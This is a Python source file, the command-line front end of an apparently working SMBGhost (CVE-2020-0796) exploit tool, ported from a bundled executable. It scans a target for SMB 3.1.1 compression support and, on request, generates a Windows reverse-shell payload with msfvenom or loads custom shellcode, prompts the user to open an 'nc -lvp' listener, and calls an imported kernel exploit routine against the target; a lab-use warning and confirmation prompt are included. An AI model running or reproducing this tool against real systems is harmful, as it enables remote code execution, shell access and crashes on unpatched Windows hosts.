#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
smbv3_exp.py — CVE-2020-0796 (SMBGhost) detection + exploitation CLI.

Python port of the entry script `SmbGhostExp.py` recovered from
`CVE-2020-0796-EXP.exe` (a PyInstaller-bundled Python program).

Two operation modes:

  * `--check`  : detect a target that negotiates SMB 3.1.1 *and* answers the
                 compression context (safe, network-only probe).
  * `-e`       : run the full kernel RCE chain against a target, delivering a
                 reverse-shell payload (msfvenom-generated, or loaded from a
                 file / the interactive shellcode menu).

The exploit path is gated behind an explicit confirmation prompt and emits a
clear warning: this is a working kernel RCE for a Windows SMB stack patched
since 2020, for authorized lab research only — a failed run will Blue-Screen
the target.
"""

import argparse
import subprocess
import sys

from .scanner import scanner_smb_ghost, scanner_smb_ghost_silent
from . import exploit


class Color:
    PURPLE = "\x1b[95m"
    CYAN = "\x1b[96m"
    DARKCYAN = "\x1b[36m"
    BLUE = "\x1b[94m"
    GREEN = "\x1b[92m"
    YELLOW = "\x1b[93m"
    RED = "\x1b[91m"
    BOLD = "\x1b[1m"
    UNDERLINE = "\x1b[4m"
    END = "\x1b[0m"


def get_args(argv=None):
    parser = argparse.ArgumentParser(
        prog="smbv3-exp",
        description="SMBGhost Detection and Exploitation (CVE-2020-0796)")
    parser.add_argument("-i", "--ip", dest="ip", type=str, required=True,
                        help="IP address")
    parser.add_argument("-p", "--port", dest="port", type=int, default="445",
                        help="SMB Port")
    parser.add_argument("--check", dest="check_vuln", action="store_true",
                        default=False, help="Check SMBGhost Vulnerability")
    parser.add_argument("-e", dest="exploit", action="store_true",
                        default=False, help="Directly exploit SMBGhost")
    parser.add_argument("--lhost", dest="lhost", type=str,
                        help="Lhost for the reverse shell")
    parser.add_argument("--lport", dest="lport", type=str,
                        help="Lport for the reverse shell")
    parser.add_argument("--arch", dest="arch", type=str, default="x64",
                        help="Architecture of the target Windows Machine")
    parser.add_argument("--silent", dest="silent", action="store_true",
                        default=False, help="Silent mode for the scanner")
    parser.add_argument("--shellcode", dest="shellcode_menu",
                        action="store_true", default=False,
                        help="Shellcode Menu to import your shell")
    parser.add_argument("--load-shellcode", dest="load_shellcode",
                        help="Load shellcode directly from file")
    return parser.parse_args(argv)


def load_shellcode(filePath):
    """Load shellcode from a file.  Accepts `\\x41\\x42..` text or a binary
    blob; returns bytes or None on failure."""
    try:
        with open(filePath, "r") as f:
            txt = f.read().strip()
        if txt.startswith("\\x") or "\\x" in txt:
            # "\\x41\\x42.." style string
            txt = txt.replace("\\x", "")
            return bytes.fromhex(txt)
        return txt.encode()
    except Exception:
        try:
            with open(filePath, "rb") as f:
                return f.read()
        except Exception:
            return None


# module-level alias so `run_function` can call the loader even when its
# parameter is named `load_shellcode`.
_load_shellcode_file = load_shellcode


def menu_shellcode():
    print("Please choose one option: \n")
    print("1: Custom shellcode string")
    print("2: File with shellcode (\\x41\\x42..)")
    print("3: Binary file with shellcode\n")
    try:
        choose = int(input())
    except Exception:
        choose = 0
    if choose == 2 or choose == 3:
        filePath = input("File path: ")
        return load_shellcode(filePath)
    if choose == 1:
        file_shellcode = input(
            "Please enter custom shellcode (one line, no quotes, \\x00.. format): ")
        file_shellcode = file_shellcode.replace("\\x", "")
        return bytes.fromhex(file_shellcode)
    print(Color.RED + "You chose an incorrect option")
    return None


def generate_shellcode(lhost, lport, arch):
    """Generate a reverse-shell with msfvenom; returns bytes or None."""
    print(Color.BLUE + "Generating Shellcode %s with lhost %s and lport %s"
          % (arch, lhost, lport))
    if arch == "x64":
        msf_payload = "windows/x64/shell_reverse_tcp"
    else:
        msf_payload = "windows/shell_reverse_tcp"
    msf_command = "msfvenom -p " + msf_payload + " "
    msf_command += "LHOST=" + lhost + " LPORT=" + str(lport)
    msf_command += " -f hex"
    print("MSF command ->", msf_command)
    try:
        return bytes.fromhex(subprocess.check_output(msf_command, shell=True)
                             .decode("ascii"))
    except Exception as e:
        print(Color.RED + "msfvenom failed: %s" % e)
        return None


def _confirm_exploit(ip, port):
    print(Color.RED + Color.BOLD +
          "WARNING: this is a working kernel RCE (CVE-2020-0796) for a Windows "
          "target. For authorized lab use only; a failed run will Blue-Screen "
          "the target." + Color.END)
    try:
        ans = input("Exploit %s:%s? [y/N]: " % (ip, port)).strip().lower()
    except EOFError:
        return False
    return ans in ("y", "yes")


def run_function(ip, port, check_vuln=False, exploit_mode=False,
                 lhost=None, lport=None, arch="x64", silent=False,
                 shellcode_menu=False, load_shellcode=None):
    """Mirror the original `SmbGhostExp` main flow."""
    print(Color.BLUE + "The target is %s:%s" % (ip, port))

    if check_vuln:
        if silent:
            scanner_smb_ghost_silent(ip, port)
        else:
            scanner_smb_ghost(ip, port)

    if exploit_mode:
        shell = None
        if load_shellcode is not None and not shellcode_menu:
            # `load_shellcode` is a file path here; call the module loader
            shell = _load_shellcode_file(load_shellcode)
            if shell is not None:
                print(Color.BLUE + "Exploiting with custom shellcode")
        elif shellcode_menu:
            shell = menu_shellcode()
            if shell is not None:
                print(Color.BLUE + "Exploiting with custom shellcode")
        else:
            # generate a reverse shell
            if lhost is None:
                print(Color.RED + "It seems you have forgotten to put LHOST, "
                      "LPORT, ARCH options. \n Do you want to set it?")
                lhost = str(input("Enter the Lhost : "))
                lport = int(input("Enter the Lport : "))
                arch = str(input("Enter the target architecture (Default: x64) : ")
                           or "x64")
            shell = generate_shellcode(lhost, lport, arch)

        if shell is None or not shell:
            print(Color.RED + "No valid shellcode available; aborting exploit.")
            return -1

        if not _confirm_exploit(ip, port):
            print(Color.BLUE + "Aborted by user.")
            return -1

        print(Color.RED + "Please open your netcat session in a new tab before "
              "launching the exploit:\n  nc -lvp %s" % (lport if lport is not None else ""))
        try:
            input("Press any key to continue...")
        except EOFError:
            pass

        result = exploit.exploit_SMBGhost(ip, port, shell)
        if result == 0:
            print(Color.BLUE + "Exploit finished. Enjoy your reverse shell =)")
        else:
            print(Color.RED + "Something went wrong; the target may have "
                  "Blue-Screened.")
        return result


def main(argv=None):
    args = get_args(argv)
    return run_function(
        ip=args.ip,
        port=args.port,
        check_vuln=args.check_vuln,
        exploit_mode=args.exploit,
        lhost=args.lhost,
        lport=args.lport,
        arch=args.arch,
        silent=args.silent,
        shellcode_menu=args.shellcode_menu,
        load_shellcode=args.load_shellcode,
    )


if __name__ == "__main__":
    sys.exit(main())